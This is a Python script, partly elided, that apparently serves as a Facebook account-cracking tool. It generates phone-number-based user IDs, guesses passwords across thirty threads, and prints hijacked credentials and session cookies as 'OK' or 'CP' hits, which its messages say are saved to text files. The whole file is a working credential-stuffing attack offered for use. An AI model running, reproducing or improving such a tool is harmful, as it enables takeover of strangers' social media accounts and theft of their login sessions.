...
for xd in range(10000):
    ...
    ugen.append(uaku2)
logo = ("""
 \033[37;1m𝙴𝙷𝙲 SABBIR  𝙵𝚁𝙾𝙼 𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷
 \033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ...
 \033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\033[38;5;46m[🦋] 𝚃𝙾𝙾𝙻𝚂 𝙵𝚁𝙴𝙴
\033[38;5;46m[🦋] 𝙰𝚄𝚃𝙷𝙾𝚁 SABBIR
\033[38;5;46m[🦋] 𝙶𝙸𝚃𝙷𝚄𝙱 RDX337
\033[38;5;46m[🦋] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 MD SABBIR SR
\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
class Main:
    def __init__(self):
        self.id = []
        ...
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        Emran =input(" [√] \033[38;5;46m𝙲𝙷𝙾𝙾𝚂𝙴 𝙽𝚄𝙼𝙱𝙴𝚁 𝟷 𝙱𝙰𝚂𝚃: ")
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        if Emran in ["1", "01"]:
            v1()
        if Emran in ["2", "02"]:
...
def v1():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(' [☘️]\033[38;5;46mSABBIR BHAI')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for guru in user:
    ...
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(' [🌿]\033[38;5;46m𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫')
    print(' [🌿]\033[38;5;46𝑴𝑳𝑫𝑺 𝑺𝑨𝑽𝑬𝑫 𝑰𝑵 𝑶𝑲.𝑻𝑿𝑻.𝑪𝑷.𝑻𝑿𝑻')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
def v2():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kode = input('  [🌿]\033[38;5;46m𝚃𝙴𝚁𝙶𝙴𝚃 𝙵𝙸𝚁𝚂𝚃 𝙽𝙰𝙼𝙴: ')
    kodex = input('[🌿\033[38;5;46m]𝚃𝙴𝚁𝙶𝙴𝚃 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴:  ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    doamin = '.'
    limit = int(input('[🌿]\033[38;5;46m𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(' [🌿]\033[38;5;46m𝐓𝐎𝐓𝐀𝐋 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐈𝐃:'+tl)
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(f"[🌿]033[38;5;46m𝐓𝐄𝐑𝐆𝐄𝐓 𝐃𝐎𝐀𝐌𝐈𝐍:𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐂𝐋𝐎𝐍𝐈𝐍𝐆(,𝐍𝐀𝐌𝐄)")
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print('[🌿]033[38;5;46m𝑻𝑯𝑬 𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑺𝑻𝑨𝑹𝑻𝑬𝑫')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print('[🌿]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝑬𝑴𝑹𝑨𝑵')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for guru in user:
            ...
            yaari.submit(rcrack1,uid,pwx,tl)
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(' [🌿]\033[38;5;46m𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨?? 𝑩𝑬𝑬𝑵 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫')
    print(' [🌿]\033[38;5;46m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫 𝑺𝑨𝑽𝑬𝑫 𝑰𝑵 𝑶𝑲 𝑻𝑿𝑻 𝑪𝑷 𝑻𝑿𝑻')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
def v3():
    user=[]
    os.system('clear')
    ...
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kode = input(' [🌿]\033[38;5;46m𝙴𝙽𝚃𝙴𝚁 𝚂𝙸𝙼𝙴 𝙲𝙾𝙳𝙴: ')
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    doamin = '[🌿]\033[38;5;46m𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝚅𝙸𝙿 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 (𝙱𝙳 𝙽𝚄𝙼𝙱𝙴𝚁) '
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    limit = int(input('[🌿]\033[38;5;46m𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃: '))
    print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    for nmbr in range(limit):
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(' \033[1;33m[🌿]\033[38;5;46m𝑻𝑶𝑻𝑨𝑳 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫:'+tl)
        print(f"\033[1;33m[🌿]\033[38;5;46m𝒀𝑶𝑼𝑹 𝑻𝑬𝑹𝑮𝑬𝑻 𝑪𝑹𝑨𝑪𝑲 𝑴𝑬𝑵𝑼 {doamin}")
        print(' \033[1;33m[🌿]\033[38;5;46m𝑻𝑯𝑬 𝑪𝑹𝑨𝑪𝑲 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑯𝑨𝑺 𝑩𝑬𝑬𝑵 𝑺𝑻𝑨𝑹𝑻𝑬𝑫')
        print(' \033[1;33m[🌿]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝑬𝑴𝑹𝑨𝑵')
        print("\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        for guru in user:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSABBIR\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SABBIR-OK☘️] {uid}|{ps}")
                print(f"\n[COOKIE☘️] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SABBIR-CP☘️] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SABBIR-EHC☘️] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
